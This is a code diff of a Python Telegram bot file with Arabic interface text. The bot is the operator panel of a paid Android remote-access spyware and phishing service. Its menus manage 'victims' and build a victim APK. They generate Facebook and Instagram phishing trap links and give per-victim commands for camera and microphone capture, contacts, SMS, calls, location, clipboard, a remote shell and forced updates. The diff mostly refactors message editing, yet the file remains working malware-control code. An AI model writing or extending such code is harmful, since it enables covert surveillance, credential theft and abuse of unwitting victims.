@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# v9 — مع Silent Collector + الهندسة الاجتماعية
+# v10 — نظيف بدون تكرار (edit_message_text)
 # ============================================================
 
 import io
@@ -52,10 +52,49 @@ logger = get_logger("bot_handlers")
 # Escape HTML
 # ============================================================
 def h(text):
-    """Escape HTML characters"""
     if text is None:
         return ""
     return html.escape(str(text))
+
+
+# ============================================================
+# ★★★ Helpers — تعديل ذكي للرسالة ★★★
+# ============================================================
+def safe_edit(call, text, reply_markup=None, parse_mode="HTML"):
+    """
+    يحاول يعدل الرسالة، ولو فشل يبعت رسالة جديدة
+    """
+    try:
+        bot.edit_message_text(
+            text=text,
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            reply_markup=reply_markup,
+            parse_mode=parse_mode,
+            disable_web_page_preview=True,
+        )
+        return True
+    except Exception as e:
+        err = str(e).lower()
+        # لو الرسالة نفسها — مش مشكلة
+        if "message is not modified" in err:
+            return True
+        # لو الرسالة قديمة أوي — ابعت جديدة
+        if "message to edit not found" in err or "message can't be edited" in err:
+            try:
+                bot.send_message(
+                    call.message.chat.id,
+                    text,
+                    reply_markup=reply_markup,
+                    parse_mode=parse_mode,
+                    disable_web_page_preview=True,
+                )
+                return True
+            except Exception as e2:
+                logger.warning(f"safe_edit fallback error: {e2}")
+        else:
+            logger.debug(f"safe_edit error: {e}")
+        return False
 
 
 # ============================================================
@@ -86,29 +125,24 @@ except ImportError:
 # القوائم
 # ============================================================
 def main_menu(user_id=None):
-    """القائمة الرئيسية"""
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
     markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
 
-    # لوحة التحكم الويب
     markup.add(InlineKeyboardButton(
         "🌐 لوحة التحكم (ويب)",
         callback_data="open_dashboard"
     ))
 
-    # ★★★ الهندسة الاجتماعية ★★★
     markup.add(InlineKeyboardButton(
         "🎭 الهندسة الاجتماعية",
         callback_data="gen_se"
     ))
 
-    # ★ الأدوات
     markup.add(InlineKeyboardButton("🎯 جمع المعلومات (Silent)", callback_data="gen_silent"))
     markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
 
-    # الاشتراكات
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
 
@@ -118,8 +152,24 @@ def main_menu(user_id=None):
     return markup
 
 
+def main_menu_text(user_id=None):
+    """نص القائمة الرئيسية"""
+    if user_id and is_admin(user_id):
+        return (
+            "👑 <b>القائمة الرئيسية</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+            "⚡ صلاحيات كاملة\n"
+            "💎 VIP لا نهائي\n\n"
+            "🎯 اختر أداة:"
+        )
+    return (
+        "⚡ <b>القائمة الرئيسية</b>\n"
+        "━━━━━━━━━━━━━━━━━━\n\n"
+        "🎯 اختر أداة:"
+    )
+
+
 def silent_collector_panel():
-    """لوحة Silent Collector"""
     m = InlineKeyboardMarkup()
     m.add(InlineKeyboardButton("➕ لينك جديد", callback_data="silent_new"))
     m.add(InlineKeyboardButton("📊 الإحصائيات", callback_data="silent_stats"))
@@ -129,10 +179,8 @@ def silent_collector_panel():
 
 
 def victim_commands_panel(victim_id):
-    """لوحة التحكم الكاملة بالضحية"""
     m = InlineKeyboardMarkup()
 
-    # ═══════ الكاميرا ═══════
     m.row(
         InlineKeyboardButton("📷 كاميرا أمامية", callback_data=f"vcmd_camfront_{victim_id}"),
         InlineKeyboardButton("📸 كاميرا خلفية", callback_data=f"vcmd_camback_{victim_id}"),
@@ -141,8 +189,6 @@ def victim_commands_panel(victim_id):
         InlineKeyboardButton("🎥 فيديو أمامية 10s", callback_data=f"vcmd_videofront_{victim_id}"),
         InlineKeyboardButton("🎥 فيديو خلفية 10s", callback_data=f"vcmd_videoback_{victim_id}"),
     )
-
-    # ═══════ الصوت ═══════
     m.row(
         InlineKeyboardButton("🎙️ تسجيل صوت 10s", callback_data=f"vcmd_audio_{victim_id}"),
     )
@@ -150,8 +196,6 @@ def victim_commands_panel(victim_id):
         InlineKeyboardButton("🔔 نغمة", callback_data=f"vcmd_sound_{victim_id}"),
         InlineKeyboardButton("🚨 إنذار", callback_data=f"vcmd_alarm_{victim_id}"),
     )
-
-    # ═══════ البيانات ═══════
     m.row(
         InlineKeyboardButton("📱 معلومات الجهاز", callback_data=f"vcmd_info_{victim_id}"),
         InlineKeyboardButton("🔋 البطارية", callback_data=f"vcmd_battery_{victim_id}"),
@@ -164,14 +208,10 @@ def victim_commands_panel(victim_id):
         InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"vcmd_contacts_{victim_id}"),
         InlineKeyboardButton("📲 التطبيقات", callback_data=f"vcmd_apps_{victim_id}"),
     )
-
-    # ═══════ الوسائط ═══════
     m.row(
         InlineKeyboardButton("🖼️ الصور", callback_data=f"vcmd_photos_{victim_id}"),
         InlineKeyboardButton("🎬 الفيديوهات", callback_data=f"vcmd_videos_{victim_id}"),
     )
-
-    # ═══════ الموقع والشبكة ═══════
     m.row(
         InlineKeyboardButton("📍 الموقع", callback_data=f"vcmd_location_{victim_id}"),
         InlineKeyboardButton("📶 معلومات WiFi", callback_data=f"vcmd_wifi_{victim_id}"),
@@ -179,8 +219,6 @@ def victim_commands_panel(victim_id):
     m.row(
         InlineKeyboardButton("📋 الحافظة", callback_data=f"vcmd_clipboard_{victim_id}"),
     )
-
-    # ═══════ التحكم ═══════
     m.row(
         InlineKeyboardButton("📳 اهتزاز", callback_data=f"vcmd_vibrate_{victim_id}"),
         InlineKeyboardButton("🔊 صوت أقصى", callback_data=f"vcmd_volmax_{victim_id}"),
@@ -189,8 +227,6 @@ def victim_commands_panel(victim_id):
         InlineKeyboardButton("🔉 خفض الصوت", callback_data=f"vcmd_volmute_{victim_id}"),
         InlineKeyboardButton("⚡ صوت متوسط", callback_data=f"vcmd_volmid_{victim_id}"),
     )
-
-    # ═══════ الميديا ═══════
     m.row(
         InlineKeyboardButton("⏯️ تشغيل/إيقاف", callback_data=f"vcmd_mediaplay_{victim_id}"),
         InlineKeyboardButton("⏭️ التالي", callback_data=f"vcmd_medianext_{victim_id}"),
@@ -198,8 +234,6 @@ def victim_commands_panel(victim_id):
     m.row(
         InlineKeyboardButton("⏮️ السابق", callback_data=f"vcmd_mediaprev_{victim_id}"),
     )
-
-    # ═══════ الشاشة ═══════
     m.row(
         InlineKeyboardButton("🌑 إطفاء الشاشة", callback_data=f"vcmd_screenoff_{victim_id}"),
         InlineKeyboardButton("🔒 قفل كامل", callback_data=f"vcmd_lock_{victim_id}"),
@@ -207,8 +241,6 @@ def victim_commands_panel(victim_id):
     m.row(
         InlineKeyboardButton("🏠 الرئيسية", callback_data=f"vcmd_home_{victim_id}"),
     )
-
-    # ═══════ التواصل ═══════
     m.row(
         InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"vcmd_sendsms_{victim_id}"),
         InlineKeyboardButton("📞 مكالمة", callback_data=f"vcmd_call_{victim_id}"),
@@ -217,13 +249,9 @@ def victim_commands_panel(victim_id):
         InlineKeyboardButton("🌐 فتح رابط", callback_data=f"vcmd_url_{victim_id}"),
         InlineKeyboardButton("💬 Toast", callback_data=f"vcmd_toast_{victim_id}"),
     )
-
-    # ═══════ متقدم ═══════
     m.row(
         InlineKeyboardButton("💻 Shell", callback_data=f"vcmd_shell_{victim_id}"),
     )
-
-    # ═══════ الإدارة ═══════
     m.row(
         InlineKeyboardButton("🔄 تحديث", callback_data=f"v_refresh_{victim_id}"),
         InlineKeyboardButton("✏️ تغيير الاسم", callback_data=f"v_rename_{victim_id}"),
@@ -234,29 +262,20 @@ def victim_commands_panel(victim_id):
     return m
 
 
-# ============================================================
-# لوحة التحديث
-# ============================================================
 def build_update_panel():
-    """لوحة التحكم في التحديثات"""
     m = InlineKeyboardMarkup()
-
     m.add(InlineKeyboardButton("📊 حالة التحديث", callback_data="upd_status"))
     m.add(InlineKeyboardButton("🚀 إجبار كل الضحايا على التحديث", callback_data="upd_force_all"))
     m.add(InlineKeyboardButton("🎯 تحديث ضحية محددة", callback_data="upd_target"))
-
     m.row(
         InlineKeyboardButton("🔍 فحص آخر Release", callback_data="upd_check_release"),
         InlineKeyboardButton("♻️ مسح Cache", callback_data="upd_clear_cache"),
     )
-
     m.row(
         InlineKeyboardButton("📜 سجل التحديثات", callback_data="upd_history"),
         InlineKeyboardButton("⚙️ إعدادات", callback_data="upd_settings"),
     )
-
     m.add(InlineKeyboardButton("🔙 رجوع للأدمن", callback_data="admin_panel"))
-
     return m
 
 
@@ -264,11 +283,9 @@ def build_update_panel():
 # دوال التحديث
 # ============================================================
 def get_update_status_text():
-    """يجيب نص حالة التحديث"""
     try:
         version_code = CURRENT_VERSION_CODE
         version_name = CURRENT_VERSION_NAME
-
         latest = _get_cached_apk_info() or _find_latest_apk_release()
 
         total_victims = 0
@@ -298,11 +315,9 @@ def get_update_status_text():
         text = (
             "📊 <b>حالة نظام التحديث</b>\n"
             "━━━━━━━━━━━━━━━━━━\n\n"
-
             "🔢 <b>النسخة الحالية على السيرفر:</b>\n"
             f"  • الكود: <code>{version_code}</code>\n"
             f"  • الاسم: <code>{version_name}</code>\n\n"
-
             "📦 <b>آخر Release على GitHub:</b>\n"
         )
 
@@ -310,7 +325,6 @@ def get_update_status_text():
             text += (
                 f"  • الاسم: <code>{h(latest.get('version_name', '?'))}</code>\n"
                 f"  • الحجم: <code>{latest.get('size', 0) / 1024 / 1024:.2f} MB</code>\n"
-                f"  • الملف: <code>{h(latest.get('name', '?'))}</code>\n"
             )
         else:
             text += "  • <i>لا يوجد release</i>\n"
@@ -318,11 +332,9 @@ def get_update_status_text():
         text += (
             "\n👥 <b>الضحايا:</b>\n"
             f"  • الإجمالي: <code>{total_victims}</code>\n\n"
-
             "📈 <b>إحصائيات التحديث:</b>\n"
             f"  • ✅ نجح: <code>{update_success}</code>\n"
             f"  • ❌ فشل: <code>{update_failed}</code>\n\n"
-
             "🎯 <b>Force Update:</b>\n"
             f"  • الحالة: {'🔴 نشط' if force_active else '⚪ غير نشط'}\n"
         )
@@ -372,14 +384,13 @@ def start_command(message):
             f"👑 <b>مرحباً أيها الأدمن {h(user_name)}!</b>\n\n"
             f"⚡ صلاحيات كاملة.\n"
             f"💎 VIP لا نهائي.\n\n"
-            f"🎛️ استخدم اللوحة للتحكم."
+            f"🎛️ اختر أداة:"
         )
     else:
         text = (
             f"⚡ <b>مرحباً {h(user_name)}</b>\n\n"
             f"🎯 نظام إدارة الضحايا\n\n"
-            f"📱 اضغط <b>إدارة الضحايا</b> للبدء\n"
-            f"🎭 أو افتح <b>الهندسة الاجتماعية</b>"
+            f"🎛️ اختر أداة:"
         )
 
     bot.send_message(
@@ -390,14 +401,12 @@ def start_command(message):
 
 
 # ============================================================
-# /silent — أمر سريع
+# /silent
 # ============================================================
 @bot.message_handler(commands=['silent', 'collect'])
 def silent_command(message):
-    """أمر سريع لإنشاء رابط Silent Collector"""
     chat_id = message.chat.id
     user_id = message.from_user.id
-
     logger.info(f"/silent from {user_id}")
 
     try:
@@ -437,10 +446,8 @@ def silent_command(message):
 # ============================================================
 @bot.message_handler(commands=['dashboard', 'dash', 'panel_web', 'web'])
 def dashboard_command(message):
-    """أمر سريع لفتح الـ Dashboard"""
     chat_id = message.chat.id
     user_id = message.from_user.id
-
     logger.info(f"/dashboard from {user_id}")
 
     try:
@@ -474,7 +481,6 @@ def dashboard_command(message):
             parse_mode="HTML",
             reply_markup=markup
         )
-        logger.info(f"Dashboard link sent to {user_id}")
 
     except Exception as e:
         logger.exception(f"dashboard_command error: {e}")
@@ -486,7 +492,6 @@ def dashboard_command(message):
 # ============================================================
 @bot.message_handler(commands=['update', 'updates', 'update_panel'])
 def update_command(message):
-    """لوحة التحديثات"""
     chat_id = message.chat.id
     user_id = message.from_user.id
 
@@ -499,13 +504,7 @@ def update_command(message):
     text = (
         "⚙️ <b>إدارة التحديثات</b>\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "🎯 <b>خيارات التحديث:</b>\n"
-        "• 📊 حالة النظام\n"
-        "• 🚀 إجبار كل الضحايا\n"
-        "• 🎯 تحديث ضحية محددة\n"
-        "• 🔍 فحص GitHub Releases\n"
-        "• 📜 سجل التحديثات\n"
-        "• ⚙️ إعدادات متقدمة"
+        "🎯 اختر العملية:"
     )
 
     bot.send_message(chat_id, text, parse_mode="HTML",
@@ -529,7 +528,7 @@ def callback_handler(call):
 
 
 def _handle_callback(call, chat_id, user_id, data):
-    """المنطق الفعلي للـ callback"""
+    """المنطق الفعلي — يستخدم safe_edit لتعديل الرسالة"""
 
     # ============================================================
     # ★★★ الهندسة الاجتماعية ★★★
@@ -548,15 +547,16 @@ def _handle_callback(call, chat_id, user_id, data):
         check = can_use_tool(chat_id, "silent")
         if not check["allowed"]:
             bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            bot.send_message(
-                chat_id,
+            safe_edit(
+                call,
                 _deny_message(check["reason"], chat_id, "silent", check),
-                parse_mode="HTML"
+                reply_markup=main_menu(user_id)
             )
             return
         consume_usage(chat_id, "silent")
         bot.answer_callback_query(call.id)
 
+        # نبعت رسالة جديدة لطلب الاسم (لأنها تحتاج input)
         msg = bot.send_message(
             chat_id,
             "🎯 <b>جمع المعلومات</b>\n"
@@ -570,13 +570,17 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data == "silent_new":
-        bot.answer_callback_query(call.id)
         check = can_use_tool(chat_id, "silent")
         if not check["allowed"]:
-            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "silent", check),
-                             parse_mode="HTML")
+            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+            safe_edit(
+                call,
+                _deny_message(check["reason"], chat_id, "silent", check),
+                reply_markup=main_menu(user_id)
+            )
             return
         consume_usage(chat_id, "silent")
+        bot.answer_callback_query(call.id)
 
         msg = bot.send_message(
             chat_id,
@@ -612,8 +616,7 @@ def _handle_callback(call, chat_id, user_id, data):
             logger.exception(f"silent_stats error: {e}")
             text = f"❌ خطأ: {h(str(e)[:200])}"
 
-        bot.send_message(chat_id, text, parse_mode="HTML",
-                         reply_markup=silent_collector_panel())
+        safe_edit(call, text, reply_markup=silent_collector_panel())
         return
 
     if data == "silent_recent":
@@ -623,10 +626,9 @@ def _handle_callback(call, chat_id, user_id, data):
             sessions = get_user_silent_sessions(user_id, limit=10) or []
 
             if not sessions:
-                bot.send_message(
-                    chat_id,
+                safe_edit(
+                    call,
                     "📭 <b>لا يوجد لينكات بعد</b>",
-                    parse_mode="HTML",
                     reply_markup=silent_collector_panel()
                 )
                 return
@@ -649,16 +651,12 @@ def _handle_callback(call, chat_id, user_id, data):
                 label_text = f" — {h(label)}" if label else ""
                 lines.append(f"{icon} <code>{h(sid)}</code>{label_text}")
 
-            bot.send_message(
-                chat_id,
-                "\n".join(lines),
-                parse_mode="HTML",
-                reply_markup=silent_collector_panel()
-            )
+            safe_edit(call, "\n".join(lines), reply_markup=silent_collector_panel())
 
         except Exception as e:
             logger.exception(f"silent_recent error: {e}")
-            bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:200])}", parse_mode="HTML")
+            safe_edit(call, f"❌ خطأ: {h(str(e)[:200])}",
+                      reply_markup=silent_collector_panel())
         return
 
     # ============================================================
@@ -673,25 +671,33 @@ def _handle_callback(call, chat_id, user_id, data):
             link = generate_magic_link(user_id)
 
             if not link:
-                bot.send_message(chat_id, "❌ فشل توليد الرابط، حاول مرة أخرى")
+                safe_edit(
+                    call,
+                    "❌ فشل توليد الرابط، حاول مرة أخرى",
+                    reply_markup=main_menu(user_id)
+                )
                 return
 
             markup = InlineKeyboardMarkup()
             markup.add(InlineKeyboardButton("🚀 ادخل لوحة التحكم", url=link))
+            markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
 
-            bot.send_message(
-                chat_id,
+            safe_edit(
+                call,
                 "🔐 <b>رابط الدخول للوحة التحكم</b>\n"
                 "━━━━━━━━━━━━━━━━━━\n"
                 "⏰ <i>الرابط صالح لمدة 5 دقائق فقط</i>\n"
                 "🛡️ <i>لا تشاركه مع أي شخص</i>",
-                parse_mode="HTML",
                 reply_markup=markup
             )
 
         except Exception as e:
             logger.exception(f"open_dashboard error: {e}")
-            bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")
+            safe_edit(
+                call,
+                f"❌ خطأ: {h(str(e)[:100])}",
+                reply_markup=main_menu(user_id)
+            )
 
         return
 
@@ -705,8 +711,7 @@ def _handle_callback(call, chat_id, user_id, data):
         bot.answer_callback_query(call.id, "📊 جاري القراءة...")
 
         text = get_update_status_text()
-        bot.send_message(chat_id, text, parse_mode="HTML",
-                         reply_markup=build_update_panel())
+        safe_edit(call, text, reply_markup=build_update_panel())
         return
 
     if data == "upd_check_release":
@@ -726,8 +731,7 @@ def _handle_callback(call, chat_id, user_id, data):
                     f"📦 <b>الاسم:</b> <code>{h(latest.get('name', '?'))}</code>\n"
                     f"🏷️ <b>الإصدار:</b> <code>{h(latest.get('version_name', '?'))}</code>\n"
                     f"💾 <b>الحجم:</b> <code>{latest.get('size', 0) / 1024 / 1024:.2f} MB</code>\n"
-                    f"📅 <b>التاريخ:</b> <code>{h(latest.get('published_at', '?'))}</code>\n\n"
-                    f"🔗 <a href=\"{h(latest.get('release_url', ''))}\">فتح Release</a>"
+                    f"📅 <b>التاريخ:</b> <code>{h(latest.get('published_at', '?'))}</code>\n"
                 )
             else:
                 text = "❌ <b>لا يوجد APK على GitHub Releases</b>"
@@ -735,9 +739,7 @@ def _handle_callback(call, chat_id, user_id, data):
             logger.exception(f"upd_check_release error: {e}")
             text = f"❌ خطأ: {h(str(e)[:200])}"
 
-        bot.send_message(chat_id, text, parse_mode="HTML",
-                         reply_markup=build_update_panel(),
-                         disable_web_page_preview=True)
+        safe_edit(call, text, reply_markup=build_update_panel())
         return
 
     if data == "upd_force_all":
@@ -751,8 +753,8 @@ def _handle_callback(call, chat_id, user_id, data):
             InlineKeyboardButton("❌ إلغاء", callback_data="upd_status"),
         )
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
+        safe_edit(
+            call,
             "⚠️ <b>تأكيد التحديث الشامل</b>\n"
             "━━━━━━━━━━━━━━━━━━\n\n"
             "🚨 هذا الأمر سيجبر <b>كل الضحايا المتصلين</b> على:\n"
@@ -760,7 +762,6 @@ def _handle_callback(call, chat_id, user_id, data):
             "• تحميل التحديث الجديد\n"
             "• تثبيته تلقائياً\n\n"
             "هل أنت متأكد؟",
-            parse_mode="HTML",
             reply_markup=m
         )
         return
@@ -795,8 +796,7 @@ def _handle_callback(call, chat_id, user_id, data):
             logger.exception(f"upd_force_all_confirm error: {e}")
             text = f"❌ خطأ: {h(str(e)[:200])}"
 
-        bot.send_message(chat_id, text, parse_mode="HTML",
-                         reply_markup=build_update_panel())
+        safe_edit(call, text, reply_markup=build_update_panel())
         return
 
     if data == "upd_target":
@@ -835,15 +835,14 @@ def _handle_callback(call, chat_id, user_id, data):
                     except Exception:
                         pass
 
-            bot.send_message(
-                chat_id,
+            safe_edit(
+                call,
                 "✅ <b>تم مسح Cache</b>",
-                parse_mode="HTML",
                 reply_markup=build_update_panel()
             )
         except Exception as e:
             logger.exception(f"upd_clear_cache error: {e}")
-            bot.send_message(chat_id, f"❌ {h(str(e)[:200])}", parse_mode="HTML")
+            safe_edit(call, f"❌ {h(str(e)[:200])}", reply_markup=build_update_panel())
         return
 
     if data == "upd_history":
@@ -855,7 +854,7 @@ def _handle_callback(call, chat_id, user_id, data):
 
         try:
             if not redis_client:
-                bot.send_message(chat_id, "❌ Redis غير متصل")
+                safe_edit(call, "❌ Redis غير متصل", reply_markup=build_update_panel())
                 return
 
             history_raw = redis_client.lrange("update_history", 0, 19) or []
@@ -881,8 +880,7 @@ def _handle_callback(call, chat_id, user_id, data):
             logger.exception(f"upd_history error: {e}")
             text = f"❌ {h(str(e)[:200])}"
 
-        bot.send_message(chat_id, text, parse_mode="HTML",
-                         reply_markup=build_update_panel())
+        safe_edit(call, text, reply_markup=build_update_panel())
         return
 
     if data == "upd_settings":
@@ -905,8 +903,7 @@ def _handle_callback(call, chat_id, user_id, data):
         except Exception as e:
             text = f"❌ {h(str(e)[:200])}"
 
-        bot.send_message(chat_id, text, parse_mode="HTML",
-                         reply_markup=build_update_panel())
+        safe_edit(call, text, reply_markup=build_update_panel())
         return
 
     # ============================================================
@@ -935,6 +932,8 @@ def _handle_callback(call, chat_id, user_id, data):
                     callback_data=f"v_open_{vid}"
                 ))
 
+        m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))
+
         text = (
             f"👥 <b>إدارة الضحايا</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
@@ -946,7 +945,7 @@ def _handle_callback(call, chat_id, user_id, data):
         else:
             text += "👇 اختر ضحية للتحكم بها"
 
-        bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=m)
+        safe_edit(call, text, reply_markup=m)
         return
 
     # ============================================================
@@ -956,8 +955,11 @@ def _handle_callback(call, chat_id, user_id, data):
         bot.answer_callback_query(call.id)
         check = can_use_tool(chat_id, "apk")
         if not check["allowed"]:
-            bot.send_message(chat_id, "❌ لا يوجد رصيد. اشترك أولاً.",
-                             reply_markup=build_main_payment_keyboard())
+            safe_edit(
+                call,
+                "❌ لا يوجد رصيد. اشترك أولاً.",
+                reply_markup=build_main_payment_keyboard()
+            )
             return
         consume_usage(chat_id, "apk")
 
@@ -1017,8 +1019,7 @@ def _handle_callback(call, chat_id, user_id, data):
             f"🎛️ <b>اختر الأمر:</b>"
         )
 
-        bot.send_message(chat_id, text, parse_mode="HTML",
-                         reply_markup=victim_commands_panel(victim_id))
+        safe_edit(call, text, reply_markup=victim_commands_panel(victim_id))
         return
 
     # ============================================================
@@ -1236,7 +1237,6 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.answer_callback_query(call.id,
                                        "✅ تم الإرسال" if ok else "❌ فشل",
                                        show_alert=not ok)
-            logger.info(f"APK Command: {action_key} → {device_id[:8]}")
             return
 
         bot.answer_callback_query(call.id, f"❓ {action_key}", show_alert=True)
@@ -1250,11 +1250,10 @@ def _handle_callback(call, chat_id, user_id, data):
         victim = get_victim(chat_id, victim_id)
         if victim:
             bot.answer_callback_query(call.id, "🔄 تم التحديث")
-            bot.send_message(
-                chat_id,
+            safe_edit(
+                call,
                 f"👤 <b>{h(victim.get('name'))}</b>",
-                reply_markup=victim_commands_panel(victim_id),
-                parse_mode="HTML"
+                reply_markup=victim_commands_panel(victim_id)
             )
         return
 
@@ -1277,10 +1276,10 @@ def _handle_callback(call, chat_id, user_id, data):
             InlineKeyboardButton("❌ إلغاء", callback_data=f"v_open_{victim_id}"),
         )
         bot.answer_callback_query(call.id)
-        bot.send_message(
-            chat_id,
+        safe_edit(
+            call,
             f"⚠️ <b>حذف ضحية {h(victim.get('name'))}?</b>",
-            reply_markup=m, parse_mode="HTML"
+            reply_markup=m
         )
         return
 
@@ -1288,7 +1287,11 @@ def _handle_callback(call, chat_id, user_id, data):
         victim_id = data.replace("v_confirm_del_", "")
         delete_victim(chat_id, victim_id)
         bot.answer_callback_query(call.id, "🗑️ تم الحذف")
-        bot.send_message(chat_id, "✅ تم الحذف")
+        safe_edit(
+            call,
+            "✅ <b>تم الحذف</b>",
+            reply_markup=main_menu(user_id)
+        )
         return
 
     # ============================================================
@@ -1296,16 +1299,20 @@ def _handle_callback(call, chat_id, user_id, data):
     # ============================================================
     if data == "payment_menu":
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, "💎 <b>قسم الاشتراكات</b>",
-                         reply_markup=build_main_payment_keyboard(),
-                         parse_mode="HTML")
+        safe_edit(
+            call,
+            "💎 <b>قسم الاشتراكات</b>",
+            reply_markup=build_main_payment_keyboard()
+        )
         return
 
     if data == "show_plans":
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, build_plans_text(),
-                         reply_markup=build_plans_keyboard(),
-                         parse_mode="HTML")
+        safe_edit(
+            call,
+            build_plans_text(),
+            reply_markup=build_plans_keyboard()
+        )
         return
 
     if data.startswith("buy_plan_"):
@@ -1316,12 +1323,22 @@ def _handle_callback(call, chat_id, user_id, data):
 
     if data == "my_account":
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, build_account_text(chat_id), parse_mode="HTML")
+        safe_edit(
+            call,
+            build_account_text(chat_id),
+            reply_markup=InlineKeyboardMarkup().add(
+                InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
+            )
+        )
         return
 
     if data == "back_to_main":
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu(user_id))
+        safe_edit(
+            call,
+            main_menu_text(user_id),
+            reply_markup=main_menu(user_id)
+        )
         return
 
     if data == "noop":
@@ -1336,8 +1353,11 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.answer_callback_query(call.id, "❌", show_alert=True)
             return
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, "👑 <b>لوحة تحكم الأدمن</b>",
-                         reply_markup=build_admin_menu(), parse_mode="HTML")
+        safe_edit(
+            call,
+            "👑 <b>لوحة تحكم الأدمن</b>",
+            reply_markup=build_admin_menu()
+        )
         return
 
     if data == "admin_updates":
@@ -1345,10 +1365,9 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.answer_callback_query(call.id, "❌", show_alert=True)
             return
         bot.answer_callback_query(call.id, "⚙️ جاري الفتح...")
-        bot.send_message(
-            chat_id,
+        safe_edit(
+            call,
             "⚙️ <b>إدارة التحديثات</b>",
-            parse_mode="HTML",
             reply_markup=build_update_panel()
         )
         return
@@ -1366,9 +1385,11 @@ def _handle_callback(call, chat_id, user_id, data):
             return
         users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, f"👥 <b>المستخدمون ({len(users)})</b>",
-                         reply_markup=build_admin_users_keyboard(users, page),
-                         parse_mode="HTML")
+        safe_edit(
+            call,
+            f"👥 <b>المستخدمون ({len(users)})</b>",
+            reply_markup=build_admin_users_keyboard(users, page)
+        )
         return
 
     if data.startswith("admin_user_"):
@@ -1383,9 +1404,11 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.answer_callback_query(call.id, "❌ غير موجود", show_alert=True)
             return
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, build_user_info_text(uid, user),
-                         reply_markup=build_user_detail_keyboard(uid, user),
-                         parse_mode="HTML")
+        safe_edit(
+            call,
+            build_user_info_text(uid, user),
+            reply_markup=build_user_detail_keyboard(uid, user)
+        )
         return
 
     if data.startswith("admin_ban_user_"):
@@ -1423,8 +1446,8 @@ def _handle_callback(call, chat_id, user_id, data):
         bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=True)
         try:
             bot.send_message(uid, "💎 <b>تهانينا!</b> VIP مُفعّل 🚀", parse_mode="HTML")
-        except Exception as e:
-            logger.warning(f"notify vip user error: {e}")
+        except Exception:
+            pass
         return
 
     if data.startswith("admin_remove_vip_"):
@@ -1466,8 +1489,7 @@ def _handle_callback(call, chat_id, user_id, data):
         )
         m.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
         m.row(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))
-        bot.send_message(chat_id, f"📅 <b>اختر الباقة</b> <code>{uid}</code>",
-                         reply_markup=m, parse_mode="HTML")
+        safe_edit(call, f"📅 <b>اختر الباقة</b> <code>{uid}</code>", reply_markup=m)
         return
 
     if data.startswith("admin_activate_"):
@@ -1490,8 +1512,8 @@ def _handle_callback(call, chat_id, user_id, data):
                 bot.send_message(uid,
                     f"🎉 <b>تم تفعيل اشتراكك!</b>\n📅 ينتهي: <code>{expires.strftime('%Y-%m-%d')}</code>",
                     parse_mode="HTML")
-            except Exception as e:
-                logger.warning(f"notify user subscription error: {e}")
+            except Exception:
+                pass
         except Exception as e:
             logger.exception(f"activate_subscription error: {e}")
             bot.answer_callback_query(call.id, f"❌ {e}", show_alert=True)
@@ -1501,10 +1523,9 @@ def _handle_callback(call, chat_id, user_id, data):
         if not is_admin(user_id):
             return
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, build_admin_stats_text(),
-                         reply_markup=InlineKeyboardMarkup().add(
-                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
-                         ), parse_mode="HTML")
+        m = InlineKeyboardMarkup()
+        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
+        safe_edit(call, build_admin_stats_text(), reply_markup=m)
         return
 
     if data == "admin_recent":
@@ -1519,10 +1540,9 @@ def _handle_callback(call, chat_id, user_id, data):
             icon = "👑" if is_admin(uid) else "💎" if u.get("is_vip") else "🚫" if u.get("is_banned") else "👤"
             lines.append(f"{icon} <b>{h(name)}</b> — <code>{uid}</code>")
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, "\n".join(lines),
-                         reply_markup=InlineKeyboardMarkup().add(
-                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
-                         ), parse_mode="HTML")
+        m = InlineKeyboardMarkup()
+        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
+        safe_edit(call, "\n".join(lines), reply_markup=m)
         return
